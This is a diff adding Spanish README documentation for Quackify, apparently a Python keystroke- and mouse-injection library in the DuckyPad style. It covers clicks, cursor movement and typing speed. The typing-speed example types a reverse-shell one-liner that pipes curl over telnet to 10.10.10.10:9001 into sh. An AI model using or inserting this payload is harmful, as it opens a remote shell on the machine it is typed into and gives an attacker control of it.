@@ -62,3 +62,57 @@ send.string("Hola")
 delay.delay(500)
 send.string("Mundo")
 ```
+
+**Quackify también incluye funciones para interactuar con el cursor, como clic derecho, clic izquierdo, emulación de clic de rueda del mouse, así como para mover el cursor a coordenadas específicas y para imprimir las coordenadas actuales del cursor.**
+
+```python
+# mouse_click.right()  =  RMOUSE
+# mouse_click.left() = LMOUSE
+# mouse_clicl.middle() = MMOUSE
+````
+
+Emular click derecho, izquierdo y rueda del mouse:
+
+```python
+from quackify import mouse_click
+
+# Click derecho
+mouse_click.right()
+
+# Click  izquierdo
+
+mouse_click.left()
+
+# Clickear usando la rueda del mouse
+
+mouse_click.middle()
+```
+
+Con Quackify, también puedes emular el movimiento del cursor de manera similar a la función "MOUSE_MOVE" de DuckyPad.
+
+```python
+from quackify import mouse_move
+
+mouse_move.move(1344, 17)
+```
+
+Con esto, el cursor se moverá a las coordenadas proporcionadas. Además, Quackify incluye la función **"get_pos"**, que nos permitirá visualizar la posición actual del cursor.
+
+```python
+from quackify import mouse_move
+
+mouse_move.get_pos()
+```
+
+Con esto, se mostrarían las coordenadas x,y del cursor, y no sería necesario agregar un comando print, ya que este ya está integrado en el código.
+
+También, la función string incluye una función adicional llamada **"speed"**. Con esta función, podremos configurar la velocidad a la que el script escribirá, como se muestra en el siguiente ejemplo:
+
+```python
+from quackify import send
+
+send.speed(1)
+send.string("C='curl -Ns telnet://10.10.10.10:9001'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/nul")
+```
+
+Si se desea ajustar la velocidad de escritura, es necesario **declarar la función "send.speed" antes de llamar la funcion "send.string"**.
